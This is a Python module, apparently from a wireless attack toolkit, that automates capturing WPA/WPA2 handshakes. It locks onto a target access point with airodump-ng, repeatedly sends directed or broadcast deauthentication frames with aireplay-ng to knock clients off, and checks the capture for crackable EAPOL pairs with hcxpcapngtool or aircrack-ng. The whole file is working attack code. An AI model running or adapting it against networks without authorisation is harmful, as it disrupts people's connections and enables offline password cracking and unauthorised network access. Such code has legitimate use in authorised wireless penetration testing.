# -*- coding: utf-8 -*-
"""WPA/WPA2 handshake capture — airodump-ng + aireplay-ng, structured detection.

No stdout scraping of a wrapper: airodump writes a pcap, and we confirm the
handshake by running aircrack-ng against it non-interactively.
"""
import os
import re
import subprocess
import time

import config
from attack import interface as iface_mod
from attack import tools
from attack.model import AttackEvent, EventType

# Settle before first deauth; broadcast only after this if still no clients.
_SETTLE_SEC = 3.0
_BROADCAST_GRACE_SEC = 8.0


def _safe(name):
    return re.sub(r"[^A-Za-z0-9_-]", "_", (name or "unknown"))[:24]


def _clients(csv_path, bssid):
    """Station MACs associated with `bssid` in airodump's live -01.csv."""
    try:
        with open(csv_path, encoding="utf-8", errors="ignore") as f:
            text = f.read()
    except OSError:
        return []
    idx = text.find("Station MAC")          # second section = associated clients
    if idx < 0:
        return []
    macs = []
    for line in text[idx:].splitlines()[1:]:
        parts = [p.strip() for p in line.split(",")]
        if len(parts) > 5 and parts[5].upper() == bssid.upper():
            macs.append(parts[0])
    return macs


def _ap_channel(csv_path, bssid):
    """Channel from airodump AP CSV row for `bssid`, or None."""
    try:
        with open(csv_path, encoding="utf-8", errors="ignore") as f:
            text = f.read()
    except OSError:
        return None
    idx = text.find("Station MAC")
    ap_text = text[:idx] if idx >= 0 else text
    for line in ap_text.splitlines():
        parts = [p.strip() for p in line.split(",")]
        if not parts or parts[0].upper() != bssid.upper():
            continue
        if len(parts) > 3:
            try:
                ch = int(parts[3])
                if ch > 0:
                    return str(ch)
            except (ValueError, TypeError):
                pass
    return None


def _start_airodump(mon, bssid, prefix, channel):
    dump_cmd = [tools.AIRODUMP]
    if channel:
        dump_cmd += ["-c", str(channel)]
    dump_cmd += ["--bssid", bssid, "-w", prefix,
                 "--output-format", "pcap,csv", mon]
    tools.log("wpa capture: %s" % " ".join(dump_cmd))
    return subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)


def _stop_proc(proc):
    if not proc:
        return
    try:
        proc.terminate()
        proc.wait(timeout=3)
    except Exception:  # noqa: BLE001
        try:
            proc.kill()
        except Exception:  # noqa: BLE001
            pass


def _deauth_ok(res):
    """True only when aireplay appears to have sent frames."""
    if not res:
        return False
    out = ((res.stdout or "") + (res.stderr or "")).strip()
    if res.returncode != 0:
        return False
    if re.search(r"No such BSSID|fixed channel.*-1", out, re.I):
        return False
    # Timed out while still waiting for a beacon — nothing sent.
    if re.search(r"Waiting for beacon", out, re.I) and not re.search(
            r"Sending\s+\d+", out, re.I):
        return False
    return True


def _hcxpcap_pair_count(cap_path):
    """Number of crackable EAPOL message pairs hcxpcapngtool found in `cap_path`.

    hcxpcapngtool actually parses the 4-way handshake state machine (M1-M4,
    ANONCE/nonce checks, RC-checked pairing) instead of pattern-matching text
    output, so it doesn't get fooled by WPS EAP-WSC traffic or a pcap that's
    still being written the way aircrack-ng's table did (that's how the old
    detector reported hs=1 on a cap with zero real handshake material).
    Returns -1 if hcxpcapngtool isn't available (caller falls back to aircrack)."""
    if not tools.HCXPCAP or not os.path.exists(cap_path):
        return -1
    out_hash = cap_path + ".22000.tmp"
    try:
        res = tools.run([tools.HCXPCAP, cap_path, "-o", out_hash], timeout=20)
    finally:
        try:
            os.remove(out_hash)
        except OSError:
            pass
    if not res:
        return -1
    out = (res.stdout or "") + (res.stderr or "")
    m = re.search(r"EAPOL pairs \(best\)\.+:\s*(\d+)", out)
    return int(m.group(1)) if m else 0


def _aircrack_handshake(cap_path, bssid):
    """True if aircrack-ng reports a WPA handshake for `bssid` in `cap_path`.

    `-w /dev/null` gives aircrack a (empty) wordlist so it runs non-interactively
    and prints the handshake count in its network table instead of prompting.
    We do NOT pass `-a 2` or `-b` — `-a 2` forces the WPA cracker which asserts
    "ap_cur != NULL" on any capture without EAPOL, and `-b` has the same issue;
    without them aircrack just prints the table ("WPA (N handshake)")."""
    res = tools.run([tools.AIRCRACK, "-w", "/dev/null", cap_path], timeout=20)
    if not res:
        return False
    out = (res.stdout or "") + (res.stderr or "")
    want = (bssid or "").replace(":", "").upper()
    for line in out.splitlines():
        # Row format: "1  AA:BB:CC:DD:EE:FF  ESSID  WPA (1 handshake)".
        if not re.search(r"[1-9]\d*\s+handshake", line, re.I):
            continue
        if want and want not in line.replace(":", "").upper():
            continue
        return True
    return False


def _has_handshake(cap_path, bssid):
    """True only if `cap_path` holds a real, crackable 4-way handshake.

    hcxpcapngtool is authoritative when available: it parses the actual EAPOL
    state machine (M1-M4 pairing), unlike aircrack-ng's table which miscounts
    a pcap that's still being written and can't tell WPS EAP-WSC traffic from
    a real handshake — that combination is what produced phantom hs=1 reports
    with zero real handshake material on disk. Falls back to aircrack-ng's
    table only when hcxpcapngtool isn't installed."""
    if not os.path.exists(cap_path):
        return False
    pairs = _hcxpcap_pair_count(cap_path)
    if pairs >= 0:
        return pairs > 0
    return _aircrack_handshake(cap_path, bssid)


def prune_captures(cap_dir=None):
    """Delete stored .cap files that hold no real handshake (+ their .csv).

    Sweeps the capture dir and removes phantom captures the old detector left
    behind. Returns (removed, kept). BSSID is taken from the filename suffix
    (..._AABBCCDDEEFF-01.cap) so aircrack matches the right row."""
    cap_dir = cap_dir or config.CAPTURE_DIR
    removed = kept = 0
    try:
        names = os.listdir(cap_dir)
    except OSError:
        return (0, 0)
    for name in names:
        if not name.endswith("-01.cap"):
            continue
        cap = os.path.join(cap_dir, name)
        m = re.search(r"_([0-9A-Fa-f]{12})-01\.cap$", name)
        bssid = ":".join(re.findall("..", m.group(1))) if m else ""
        if _has_handshake(cap, bssid):
            kept += 1
            continue
        removed += 1
        for f in (cap, cap[:-4] + ".csv"):
            try:
                os.remove(f)
            except OSError:
                pass
        tools.log("prune_captures: removed phantom %s" % name)
    tools.log("prune_captures: removed=%d kept=%d" % (removed, kept))
    return (removed, kept)


def capture(mon, target, req, emit, stop_flag):
    """Capture a handshake for one target.

    target: {"essid","bssid","channel"}. Returns {"ok","cap","essid","bssid"}.
    """
    bssid = target["bssid"]
    essid = target.get("essid") or bssid
    channel = str(target.get("channel") or "") or None
    os.makedirs(config.CAPTURE_DIR, exist_ok=True)
    prefix = os.path.join(config.CAPTURE_DIR, "%s_%s" % (_safe(essid),
                          bssid.replace(":", "")))
    cap = prefix + "-01.cap"
    csv = prefix + "-01.csv"
    signal = target.get("signal")
    # Clear stale captures for this prefix so -01 is fresh.
    for old in (cap, csv):
        try:
            os.remove(old)
        except OSError:
            pass

    timeout = config.opt_int(req.timing, "WPA Timeout", 300)
    deauth_on = config.opt_bool(req.attack_modes, "Deauth", True)
    deauth_gap = config.opt_int(req.timing, "Deauth Sec", 10)
    num_deauth = config.opt_int(req.timing, "Num Deauths", 5)

    dump = None
    try:
        # Discover channel via hopping airodump when scan left it empty —
        # never invent channel 1.
        if not channel:
            tools.log("wpa: no channel for %s — probing via airodump" % bssid)
            try:
                dump = _start_airodump(mon, bssid, prefix, None)
            except Exception as e:  # noqa: BLE001
                tools.log("airodump start failed: %s" % e)
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="airodump"))
                return {"ok": False, "essid": essid, "bssid": bssid}
            probe_deadline = time.time() + 8.0
            while time.time() < probe_deadline:
                if stop_flag and stop_flag.is_set():
                    return {"ok": False, "essid": essid, "bssid": bssid,
                            "cancelled": True}
                channel = _ap_channel(csv, bssid)
                if channel:
                    tools.log("wpa: discovered channel %s for %s" % (
                        channel, bssid))
                    target["channel"] = channel
                    break
                time.sleep(0.5)
            _stop_proc(dump)
            dump = None
            for old in (cap, csv):
                try:
                    os.remove(old)
                except OSError:
                    pass
            if not channel:
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="no channel"))
                return {"ok": False, "essid": essid, "bssid": bssid}

        iface_mod.lock_channel(mon, channel)
        try:
            dump = _start_airodump(mon, bssid, prefix, channel)
        except Exception as e:  # noqa: BLE001
            tools.log("airodump start failed: %s" % e)
            emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                             detail="airodump"))
            return {"ok": False, "essid": essid, "bssid": bssid}

        start = time.time()
        last_deauth = 0.0
        while True:
            if stop_flag and stop_flag.is_set():
                return {"ok": False, "essid": essid, "bssid": bssid,
                        "cancelled": True}
            elapsed = time.time() - start
            remaining = int(timeout - elapsed)
            if remaining <= 0:
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="timeout"))
                return {"ok": False, "essid": essid, "bssid": bssid}

            clients = _clients(csv, bssid)
            settled = elapsed >= _SETTLE_SEC or bool(clients)
            if (deauth_on and deauth_gap and settled and
                    (time.time() - last_deauth) >= deauth_gap):
                # Prefer directed -c STA. Broadcast only after grace with no
                # clients — many modern STAs/APs ignore broadcast deauth.
                if clients:
                    targets = clients
                elif elapsed >= _BROADCAST_GRACE_SEC:
                    targets = [None]
                else:
                    targets = []
                sent = 0
                for client in targets:
                    # -D disables aireplay's AP detection: without it aireplay
                    # hangs "Waiting for beacon" on directed deauth and never
                    # sends (the channel is already locked via lock_channel).
                    cmd = [tools.AIREPLAY, "--ignore-negative-one", "-D",
                           "--deauth", str(num_deauth), "-a", bssid]
                    if client:
                        cmd += ["-c", client]
                    cmd.append(mon)
                    res = tools.run(cmd, timeout=8)
                    out = ""
                    if res:
                        out = ((res.stdout or "") + (res.stderr or "")).strip()
                        tools.log("deauth %s -> %s rc=%s: %s" % (
                            bssid, client or "broadcast",
                            res.returncode, out[-200:]))
                    else:
                        tools.log("deauth %s -> %s: timeout/fail" % (
                            bssid, client or "broadcast"))
                    if _deauth_ok(res):
                        sent += 1
                last_deauth = time.time()
                if sent:
                    emit(AttackEvent(EventType.DEAUTH, essid=essid, bssid=bssid,
                                     current=num_deauth))

            emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                             phase="HS", countdown=remaining, cd_max=timeout,
                             signal=signal, clients=len(clients)))

            if _has_handshake(cap, bssid):
                # Confirm on the settled file: aircrack miscounts a pcap that
                # airodump is still writing, which is how phantom handshakes
                # (hs=1 with zero EAPOL on disk) got reported. Stop the dump,
                # let it flush, then re-verify — and delete the cap if false.
                _stop_proc(dump)
                dump = None
                time.sleep(0.8)
                if _has_handshake(cap, bssid):
                    emit(AttackEvent(EventType.HANDSHAKE, essid=essid,
                                     bssid=bssid))
                    return {"ok": True, "cap": cap, "essid": essid,
                            "bssid": bssid, "channel": channel}
                tools.log("wpa: false handshake for %s — removing %s"
                          % (bssid, os.path.basename(cap)))
                for f in (cap, csv):
                    try:
                        os.remove(f)
                    except OSError:
                        pass
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="no handshake"))
                return {"ok": False, "essid": essid, "bssid": bssid}

            time.sleep(3)
    finally:
        _stop_proc(dump)
